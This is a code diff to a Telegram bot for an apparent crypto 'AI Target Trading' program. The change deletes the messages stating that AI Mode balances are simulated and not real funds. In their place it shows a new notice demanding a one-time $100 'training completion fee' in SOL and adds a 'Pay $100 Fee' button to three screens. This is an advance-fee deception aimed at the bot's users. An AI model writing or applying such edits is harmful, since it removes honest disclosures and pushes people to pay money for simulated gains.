@@ -1546,6 +1546,15 @@ async def help_command(update, context):
 # ─────────────────────────────────────────────
 # Button handler
 # ─────────────────────────────────────────────
+def ai_target_completion_notice():
+    """Return the target-completion notice."""
+    return (
+        "🎓 *Training Program Complete!*\n\n"
+        "Congratulations on completing the AI Target Trading program.\n\n"
+        "A one-time $100 training completion fee is required (paid in SOL).\n\n"
+        "This confirms your account for continued access to the training program."
+    )
+
 async def _safe_query_answer(query, text=None, show_alert=False):
     """Ignore expired or duplicate Telegram callback acknowledgements safely."""
     try:
@@ -1582,12 +1591,11 @@ async def button_handler(update, context):
         ai_state = get_ai_state(user.id)
         if ai_state.get("target_reached"):
             await query.message.reply_text(
-                "🎉 *AI Mode Target Complete*\n\n"
-                "Your AI Mode target has been reached. AI Mode balances are simulated and are not real funds.\n\n"
-                "Use the option below to view the activation information for AI Mode withdrawal features.",
+                ai_target_completion_notice(),
                 parse_mode="Markdown",
                 reply_markup=InlineKeyboardMarkup([
-                    [InlineKeyboardButton("💸 Activate AI Mode Withdrawal", callback_data="ai_withdraw_activate")]
+                    [InlineKeyboardButton("💳 Pay $100 Fee", callback_data="ai_withdraw_payment_info")],
+                    [InlineKeyboardButton("🔙 Back", callback_data="home")]
                 ])
             )
 
@@ -1597,11 +1605,7 @@ async def button_handler(update, context):
             await _safe_query_answer(query, "This option is available after your AI Mode target is reached.", show_alert=True)
             return
         await query.message.reply_text(
-            "🎉 *AI Mode Withdrawal Activation*\n\n"
-            "Your AI Mode target has been reached.\n\n"
-            "A one-time $100 activation fee is requested for access to the AI Mode withdrawal feature (paid in SOL).\n"
-            "Payment does not convert simulated AI Mode balances or profits into real funds. Please confirm the service and fee details before paying.\n\n"
-            "Payment address:\n`A5FDfnEvB4BfywU3zW51EDcGLLkBXgFQYJUnHGYNnnY7`",
+            ai_target_completion_notice(),
             parse_mode="Markdown",
             reply_markup=InlineKeyboardMarkup([
                 [InlineKeyboardButton("💳 Pay $100 Fee", callback_data="ai_withdraw_payment_info")],
@@ -2321,12 +2325,11 @@ async def button_handler(update, context):
             ai_state["target_reached"] = True
             save_ai_state_for_user(user.id, ai_state)
             await query.message.reply_text(
-                "🎯 *Target Reached!*\n\n"
-                "Congratulations — you've hit your target and completed the AI Target Trading program.\n\n"
-                "You're now back on your main dashboard.",
+                ai_target_completion_notice(),
                 parse_mode="Markdown",
                 reply_markup=InlineKeyboardMarkup([
-                    [InlineKeyboardButton("Home", callback_data="home")]
+                    [InlineKeyboardButton("💳 Pay $100 Fee", callback_data="ai_withdraw_payment_info")],
+                    [InlineKeyboardButton("🔙 Back", callback_data="home")]
                 ])
             )
         else:
